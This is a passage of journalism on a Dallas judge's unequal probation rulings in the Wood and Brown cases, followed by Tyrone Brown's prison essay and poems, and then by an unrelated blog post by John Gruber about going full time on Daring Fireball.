Judge Dean sent him to boot camp and let him return to probation .
Only after Mr. Bivins committed two further crimes -- burglary and another robbery -- did the judge send him to prison .
He , too , is now serving a life sentence .
The Wood Crime
John Alexander Wood 's journey toward Judge Dean 's courtroom began on a March evening in 1995 .
He picked up a 22 - year - old hustler named Larry Clark on an Oak Lawn street , and they went to Mr. Wood 's nearby home .
Police reports , citing Mr. Wood 's statements and physical evidence , say the two men had sex , for which Mr. Wood paid $ 30 .
Afterward , Mr. Clark asked for a ride home , but Mr. Wood balked and demanded his money back .
A fight ensued .
Mr. Clark ran into the back yard , which was enclosed by a high fence .
Mr. Wood , using a small semiautomatic pistol , fatally shot him from behind and took the money from Mr. Clark 's pocket .
Mr. Wood , who had no criminal history , initially pleaded not guilty to murder and went to trial in 1996 .
As jurors were about to conclude deliberations , the prosecution and defense cut a deal that Judge Dean approved :
The defendant pleaded guilty to murder in exchange for 10 years of deferred - adjudication probation .
Jury forewoman Dana
Toney said the plea bargain did n't change much .
Jurors , she said , believed the killing was an accident , were close to convicting Mr. Wood of negligent homicide and would have been happy to put him on probation .
There is no court transcript of the case because there were no appeals , but Ms. Toney said the defense argument went like this : Mr. Wood feared Mr. Clark , who was high on drugs , and fired a warning shot that he hoped would scare the man off .
He stumbled when pulling the trigger , making the gun point toward Mr. Clark .
Mr. Wood largely agreed with this summary , although he told The News that he shot Mr. Clark in the side as the man turned toward him .
" It was sort of a self - defense type of situation , " Mr. Wood said .
" Judge Dean understood this . "
The official autopsy shows that Mr. Clark was shot in the back .
Mr. Jordan , who was the prosecutor , said he agreed to the plea because he sensed that jurors were sympathetic to Mr. Wood .
And indeed they were .
" Alex came across as very boyish -- a little - boy haircut , combed over , and big glasses , " Ms. Toney said .
" He did n't look like the kind of guy who would go around shooting people in the back . "
Ms. Toney said she attends Prestonwood Baptist Church and was swayed by prominent Baptist defense witnesses .
They included Mr. Wood 's father , John Alvin Wood , who was a former pastor of First Baptist Church in Waco ; and the Rev. O.S. Hawkins , who was pastor of First Baptist Church in Dallas .
" You see O.S. Hawkins , a pillar in the community , stand up and put his own reputation on the line , " she said .
" It carried a lot of weight . "
The prosecution had no such star witnesses .
Mr. Clark , the slain man , was orphaned as a little boy in Alabama -- his father drank himself to death ; his mother , after remarrying , died of injuries from a car accident .
He had maternal grandparents in rural North Texas , but the prosecutor 's efforts to get them to court failed .
So to establish the victim 's identity for jurors , Mr. Jordan had to summon a Dallas police officer who once arrested Mr. Clark for prostitution .
That opened the door to questions about criminal history , which led back to a sordid tale that the grandparents had n't told the prosecutor about .
After his mother died , Mr. Clark was raised in Oxford , Ala. , by his stepfather , whom relatives today describe as an abusive drug dealer .
When Mr. Clark reached his mid-teens , he killed the man and buried him in a shallow backyard grave .
Oxford Assistant Chief Ron Herbowy , who investigated the killing , said : " You could n't help but like the boy .
You almost felt sorry for him . "
A juvenile judge concurred , first refusing to send Mr. Clark to adult court for trial and later sentencing him to probation instead of detention .
But jurors in Dallas came to see Mr. Clark as the predatory half of the equation , even though Mr. Wood was the only armed party .
Ms. Toney 's conclusion : " You almost feel like [ Mr. Wood ] did the world a favor " by killing Mr. Clark .
Mr. Clark 's grandmother , Jane Peel , said she did n't attend the trial because she was overwhelmed by grief .
Her grandson , who 'd lived with her and at other area locations in the months before his death , was her last living link to her daughter .
Ms. Peel , now a widow , said she has come to believe that Mr. Wood got probation for murder because of his prominent father .
And " it was two gays , " she added .
" According to everyone , [ her grandson ] was a nobody .
" But that 's not true .
He was somebody who was loved . "
The Wood Aftermath
The prosecutor , Mr. Jordan , said he made his peace with the plea bargain because he expected Mr. Wood to break the rules of probation .
That 's because witnesses such as John Orr , the killer 's landlord and employer , told authorities he had an explosive temper and once threatened to kill a co-worker .
Mr. Jordan was right about the rule breaking .
But " it looks like somebody turned a blind eye , " he said .
Mr. Wood successfully completed nearly three years of probation before testing positive , in March 1999 , for cocaine use .
It was the first in a long series of troubles , probation records show .
Two months later , at 5 o'clock in the morning , Waco police stopped Mr. Wood for a minor traffic violation and found crack cocaine on the floor of the old Ford Crown Victoria he was driving .
The license plate was HOUSE 11A -- one of the numbers assigned to U.S. Rep. Chet Edwards .
Mr. Edwards , a Waco Democrat who remains in office , is married to Mr. Wood 's sister .
He told The News he was in Washington at the time and had left the car in a friend 's care ; he said he did n't know whether Mr. Wood had asked to borrow it .
The friend , real estate agent Cindy Evans , said she did n't recall .
The police reports say Mr. Wood , when asked what he and a passenger were doing in the neighborhood where he was arrested , claimed that a maid had asked him to bring her a prescription from a 24 - hour pharmacy .
The woman he identified was a drug dealer , according to the reports .
But Mr. Wood told
The News that he was in the area to pick up the passenger , a male friend who " was in all kinds of trouble . "
He said that he had n't known there was crack in the car and that the friend must have put it there .
At the time , Mr. Wood was living in Waco .
Probation officials there had been supervising him , as a courtesy to their Dallas County counterparts .
Now they washed their hands of him .
Dallas County took over supervision but , contrary to state standards , let Mr. Wood keep living in Waco .
He was assigned to a program in which a probation officer is supposed to make surprise visits to high - risk offenders instead of letting them report to a county office -- yet records show that Mr. Wood , 100 miles away , got no visits .
Dallas prosecutors asked Judge Dean to revoke his probation , citing the arrest and the cocaine test failure .
But there was no quick ruling , as there had been after Tyrone Brown tested positive for marijuana .
The judge , a Republican , left the matter pending for several months , with Mr. Wood free on bail .
Meanwhile , he failed two more drug tests in the summer of 1999 -- both times after denying that he was still using cocaine , according to probation records .
Such false denials are supposed to lead to revocation of probation , the judge 's written policies say .
But Judge Dean let him go to a private inpatient treatment center instead of prison .
Mr. Wood 's next break came while he was at the center , in Minnesota :
The district attorney 's office in Waco dropped the possession case against him and his friend , Steve Canuteson .
Prosecutor Antonio Piña said his records show that he lacked evidence to convict Mr. Wood .
He said he let Mr. Canuteson go because he pleaded guilty to an unrelated charge .
When arrested , each suspect had told officers that the drugs belonged to the other , police reports say .
Most such cases result in the conviction of both defendants , prosecution and defense experts told The News .
" When they point fingers at each other , I prosecute them both if I 've got a good case , " Mr. Piña said .
He said he did n't have records that detailed the evidence problems and did n't recall the matter .
Mr. Canuteson , who lived with Mr. Wood in 1999 , told The News that they both avoided prosecution because " it was Chet Edwards ' car . "
He did not elaborate beyond saying that " Alex had extreme political ties .
I met Chet Edwards so many times . "
Mr. Piña said the Edwards connection " never came into the picture .
... I would remember that . "
Mr. Edwards said he did n't recall meeting Mr. Canuteson and had no contact with authorities on the matter .
" I have never made a single phone call , talked to a single official or testified in any way in behalf of Alex , " he said .
" It would be totally inappropriate . "
Mr. Edwards said he was angry with his brother - in - law over the arrest and believes that " Alex should be treated by the judicial system in the same way as any other citizen .
... [ It ] should not give preferential treatment to anyone for any reasons . "
In early 2000 , Judge Dean dismissed the probation - revocation request at Dallas County prosecutors ' request .
Rachel Horton , District Attorney Bill Hill 's spokeswoman , said it is not clear why the office sought the dismissal .
By April of that year , Mr. Wood was back in trouble .
A police report says he broke a glass door to enter the Rowlett home of Margaret Worth , whom he knew from dog - show circles , and demanded a puppy they both claimed to own .
Dallas County prosecutors filed another probation - revocation motion , then withdrew it after Ms. Worth decided to drop charges .
She told The News she backed down after Mr. Wood 's father proposed a deal : " I 'd keep the puppy if I dropped the charges . "
Ms. Worth 's take on the son , who has long lived off his parents ' wealth : " Rules just do n't apply to him . "
In January 2001 , Mr. Wood failed a drug test for the fourth time -- again after denying that he was using cocaine .
Records show that a probation officer then warned that if he " even had the belief that [ Mr. Wood ] was still using drugs , " a motion would be filed recommending a prison sentence .
It turned out to be an idle threat .
In March 2001 , a probation officer found evidence that Mr. Wood had diluted his urine to pass a test , but there were no consequences .
And in early 2002 , he tested positive for the fifth time .
Judge Dean let him stay free without even paying cash bail , let him go to another drug - treatment center instead of prison , and afterward even let him travel to Italy .
Probation officials apparently did n't touch base with Waco police , where there were emerging and persistent danger signs .
Mr. Wood , for example , had been living with at least two men who had multiple criminal convictions .
One rule of probation was that he avoid people of " disreputable or harmful character . "
Probation officers " never knew about it , " Mr. Wood said .
" Basically [ the men ] were homeless , and I was too nice and let them camp out here , and it caused me trouble . "
At different times in recent years , he has accused the men of stealing from him , then told Waco police that he did n't want to prosecute .
He accused one of the men of threatening him in an effort to collect a debt .
Last summer , shortly after Judge Dean gave him the one - postcard - a- year deal , Mr. Wood and one of the housemates vanished for a time .
So did an SUV and credit card belonging to Mr. Wood 's father .
The father complained to police but did n't follow through on pressing charges .
Instead , he called an officer and said " his son had been dropped off at his residence [ with the SUV ] and was heavily sedated and could n't talk . "
Early this year , Mr. Wood summoned police because the same housemate had tried to kill himself with a drug overdose .
The man , Mr. Wood told officers , had recently stepped outside their home with a gun " hoping that the police would show up and shoot and kill him . "
Mr. Wood told The News he is now volunteering as a drug counselor at Mission Waco , a high - profile charity .
But the agency 's executive director , Jimmy Dorrell , said Mr. Wood has n't even gone though the application process and , because of the murder , could n't pass a background check .
The Brown Aftermath
All the while Mr. Wood has been free , Tyrone Brown has been behind bars .
He has n't been a model prisoner .
He started taking classes to finish his high school education , but quit .
He joined a gang -- " the closest thing to my family , " he said .
He fought with guards , which led to solitary confinement .
He flirted with suicide .
And he found out he has a daughter -- his girlfriend in Dallas , it turned out , had been pregnant when his probation was revoked .
His little girl is now a teenager , almost as old as he was back when Judge Dean wished him luck in prison .
" She got past the stage where she 'd cry every time she'd think about him , " said her mother , Omika Saulters .
Still , " she talks about her daddy all the time .
She asks , ' Is he ever coming home ? ' "
Mr. Brown has learned to talk a little about his own father , who has never visited him in prison .
" He beat us so bad , " the prisoner told The News .
Juvenile court records say he and a brother spent a year in foster care because of the father 's violence toward them and their mother .
The mom , Nora Brown , tells him that Christian faith is the way to survive prison 's hell .
" Where 's your God at now ? " he once fired back at her in a letter .
But they 've patched things up some since then .
" I tell him , ' You 've got to show those people you 're not there to make it your home , ' " said Ms. Brown , who can show you the scar near one eye where her ex-husband hit her with a candlestick .
" ' You 've got to show them you want to get out of there . ' "
In the last couple of years , Mr. Brown has cleaned up his act and renounced his gang ties , prison officials said .
He spends much of his time reading -- everything from Stephen King to self - help books to a thesaurus -- and he writes poetry .
He 's eligible for parole in 2009 .
The only way to get out sooner , state officials said , would be for Gov. Rick Perry to commute his sentence .
" I am on the verge of giving up completely , " Mr. Brown admitted , " because I am tired of holding on to nothing .
I 've been trying to hold on for over 15 years , but for the most part I 've been by myself . "

Sentenced To Life In Prison For Failing A Urine Test
My name is Tyrone Brown , better known as T Baby to some .
At age 17 I was sentenced to an aggravated life sentence in prison for smoking marijuana while on probation .
Now I know that may sound absurd and hard to believe because it sounded the same to me also when Judge Keith Dean in Dallas , Texas handed down his order more than 14 years ago .
I soon realized that just like the marijuana smoke I consumed , my life was also to be consumed by these years behind bars .
I 'm not some flawless star .
I have my faults like everyone else .
Throughout my young life I warred with myself , trying to grasp something or someone solid to hold onto , someone to show me the right way .
Tyrone with his daughter , Elaine
I was regularly sent to special schools and placed in special classes .
Stealing cars and other things only led me into juvenile jails , until age 17 when I was charged with aggravated robbery - my first and only criminal charge as an adult .
After a few months in jail , I was given a 10 - year deferred sentence and ordered to submit to conditions of probation .
Two months later I was ordered to submit to a urinalysis test -- the results showing I had smoked marijuana .
The Dallas Court revoked my probation , and I was sentenced to life in prison .
Now , as a black man at age 31 , I believe that not being able to communicate with people somehow played a major part in how I lived as a youth .
Even today it 's hard for me to communicate with my family , my mother , aunt and daughter .
It 's a feeling no one should have to endure without end .
But I have learned to write and through poetry , short stories and essays I sometimes feel I 'm saying something .
I mostly write when I 'm angry , sad or depressed -- when I try to lose myself between the lines of a page .
I 've tried suicide a few times without success over the last 14 years .
What am I to make of a life filled with failure , including failing to end my life ?
As I think now , I 'm pretty much grateful for those botched efforts .
When every waking hour is ruled by depressing thoughts , it 's hard to say exactly what the next day has hiding around its corners .
So I try to take it step by step .
I 'm haunted at night by the 1990 day when the Judge ordered me to do my life in prison .
Why did n't he order me into a drug rehabilitation program ?
I never had any demand put on me to rehabilitate myself , nor told how I could lean on the shoulder of the State for help with my " addiction " to marijuana .
Who can say , certainly not the Texas Courts , what course my life would have taken if I had been able to grow up on the outside ?
I want to say to anyone in a situation similar to mine in 1990 that you must learn everything you can about your case -- and do n't be afraid to ask lots of questions .
My biggest mistake was being unable and unwilling to communicate with my attorney about options and to ask him how well he knew his job .
My family lives almost 200 miles away , and I see my 13 - year - old daughter once or twice a year .
My mom tries to bring her and her mother to see me , but I have n't had a visit in almost two and one - half years .
No matter how the rest of my life turns out , I give special thanks to all the people and staff of November Coalition for their honest attempt to open the minds of citizens to the unjust drug laws .
Let 's not let this difficult work to reclaim lives be for nothing .
I would enjoy corresponding with anyone interested in my life and writing .
Tyrone submitted the following poems with the story you 've just read :
Moma , I love you ( written 7/04/01 )
Moma , you are the love of my life
One of a kind , beautiful and unique
May the hand of our father God hold you within reach
Always and forever , your love I will find
In the deepest recess of my heart .
Like a diamond it will shine
On days so dull , and full of gloom
Visions of your love is what makes life bloom
Endless times of fun we'd had .
You were always there when days seemed sad
Only you could ease the pains I felt
Understand the tears when I broke down and wept
That 's the reason why your love stands true and the reason why I say :
Moma , I love you !
Trapped ( written 9/26/03 )
Trapped in these shackles , my steps are limited
Though my journey be long , I will not surrender
The days are a year , and the years are forever .
Lonely is my enemy , deep as the sea .
Will I drown in sorrow , that love with no heart ?
Who can I call to caress my fears ?
God left on vacation , but I dialed him first .
My anger is loud , but my hopes are louder .
Four steps is all I am allowed to take
For the shackles are a bridle that holds me tight .
The walls are closing in ; my breath is shallow .
Will I survive ?
Why should n't I ?
Bound , but not broken , another step , though small
My thoughts are guarded ; my dreams are just illusions .
But they are mine in which I am trapped
Sunlight smiled before my eyelids - another day .
Four more steps closer to the door
A sigh of frustration , a silent prayer
Another step , though small
But I am still trapped .
Blind Love ( written 5/26/04 )
Blind -- no thoughts wasted
A wicked sneer that bites
Love smiles with a frown that can't see
Hate caressed love into laughter
And love kissed hate with passion .
Blind -- but no sight , darkness
Tears from the sky , or is it rain ?
Does God cry , can he feel my pain ?
Joy slapped kindness in the face
And peace wiped her eyes .
Blind love -- but love , love nobody
Who am I , save a nothing that can't be ?
Why dwell on love that can't see ?
When hate is pure , ready for the taking .
My eyes are open , but I 'm blind to love .
Suicide ( written 5/26/04 )
Thoughts of nothing , darkness so deep
Visions of sleep , but too steep .
Feelings so bleak , no feelings to feel
Deep is the pain , blue like rain .
But who cares , surely not time
Who'll understand the mind of a mime ?
Time does n't care , nor patience wait .
Hate is my fate , anger on my plate .
My journey is a hearse where I am trapped .
No escape from this void , no way out .
Love is only a word that can never love back
Blind to the beholder , wonder to the curious .
Death is my only option , my only love .
Embrace me darkness , caress me softly
My mind is tired ; my soul is blue .
My heart is troubled , what 's left to do
But to die ?
Do n't cry .
Blood trickles slowly down my eyes .
No one home , all alone .
Time stopped ticking ,
Now my journey here is almost done .
In a grassroots response to Tyrone 's story , a group of outraged citizens formed a grassroots group to help publicize Tyrone 's case , calling themselves " Good Luck , Mr. Brown " ( Since Ty 's release , that web site is no longer up . )

Back to the Wall
Next Prisoner of the War on Drugs
Initiative
There ’s no other way for me to start this other than by firing away :
Last week I left my full - time job at Joyent , for the sole reason so that I can write Daring Fireball as a full - time job .
Two years ago , when I made tentative steps in this direction , it was like I put the idea out there and then poked it with a stick to see what happened .
What I ’m doing now is like jumping out of a plane with this idea as my parachute .
When I launched the membership program two years ago , I was n’t sure whether it would be a failure , a bonanza , or something in - between .
Ends up it was something in - between .
I mean that in a good way , because it was way more successful than I honestly expected .
But it was also less than I had sort of secretly hoped .
What I wanted was for this to be easy — for the revenue from the memberships and t- shirts sales to amount to something that , when combined with the money from a modest dose of advertising , would clearly constitute a reasonable full - time salary .
But there ’s a reason why you ca n’t say , “ Wow , look at all those people supporting their families with their weblogs devoted to deeply intricate Mac and web nerdery , ” or , really , why there are n’t that many people supporting themselves full - time from their weblogs , period .
That reason is because it is n’t easy .
My desire for this to be easy bound me in a catch - 22 , where I felt like membership was n’t going to grow large enough unless I could put full - time effort into producing the site , but I was n’t going to be able to put full - time effort into the site until the membership revenue was large enough .
What I ’ve concluded , though , is that if I want to make a full - time income from Daring Fireball , I need to just do it full - time .
I.e. that it ’s not going to work the other way around — to wait for the revenue to burgeon and then start putting full - time effort into it .
There ’s nothing I want to do more than this .
But even so , it has been an extraordinarily difficult decision to make , partly because I ’m so prone to over - thinking that I sometimes have trouble deciding what to have for lunch , but mainly because there exists the very real possibility of failing in an excruciatingly public way .
That raises the question as to why I did n’t just do this without announcing anything .
I.e. just try putting full - time work into the site without announcing anything , and see how it goes .
But that , more or less , is just as cowardly as the original “ just keep growing the revenue until it ’s enough and then slip on over ” plan .
I see no way around telling you , the regular readers of this site , what it is that I ’m trying here .
To lay it all on the line .
The point here is n’t to guilt anyone into buying t- shirts or becoming a member ( e.g .
Oh , man , Gruber quit his job , I better help him out ) .
The point is to prove to you how much better Daring Fireball can be than it has been , and how much more you , the readers , will enjoy it , now that I ’m devoting my time to it .
Here ’s an apt quote from one of my personal heroes , Stanley Kubrick :
“ If you can talk brilliantly about a problem , it can create the consoling illusion that it has been mastered . ”
Point being : Dithering about this for another couple of years is n’t going to solve anything .
It would be better to try this now and fail than to endlessly deliberate over plans that are never put into action .
I need to just do it , and so I am .
Do n’t Settle
This is going to sound really corny , as in like literally groan - inducingly corny , and if you ’re a regular reader of this site and a fan of my writing , it is , I hope , very clear that I have a deep , perhaps even pathological , aversion to corniness .

But part of what ’s inspired me to go for this is that a few weeks ago , I finally got around to listening to Steve Jobs ’s Commencement address at Stanford last June .
It ’s a great speech , and Jobs , famously , is a great speaker .
The transcript does n’t really do it justice .
Commencements are inherently corny affairs , and it ’s doubly - corny for an avowed Mac nerd to cite Steve Jobs as a source of inspiration , but when Jobs spoke of his diagnosis of pancreatic cancer and the day he spent under the assumption that he had just a few months left to live , I found it genuinely moving .
And when Jobs spoke about his work , I was inspired :
Your work is going to fill a large part of your life , and the only way to be truly satisfied is to do what you believe is great work , and the only way to do great work is to love what you do .
If you have n’t found it yet , keep looking , and do n’t settle .
As with all matters of the heart , you ’ll know when you find it , and like any great relationship it just gets better and better as the years roll on .
So keep looking .
Do n’t settle .
This advice is n’t anything you ca n’t hear from a high school guidance counselor , but somehow there ’s a difference .
I do n’t think many high school guidance counselors actually love what it is that they ’re doing ; Jobs actually means it .
Some words sound like tripe because they ’re overused by people who do n’t actually mean them .
Daring Fireball is what I love to do .
One point I want to impress upon you is that the proper response to this announcement is n’t so much “ Congratulations ” as it is “ Good luck , I hope it works ” .
Success is far from assured , and I ’m feeling more than a little gut - wrenching uncertainty .
It ’s difficult for me to write this sort of thing , to step out from behind the curtain and address you , the reader , directly — as I wrote two years ago , “ Just me , your humble author , hat in hand , heart in throat , asking for your support ” .
For those of you who think this is worthwhile , however , that ’s what I ’m doing : asking for your support .
And I do n’t know how to do so otherwise .
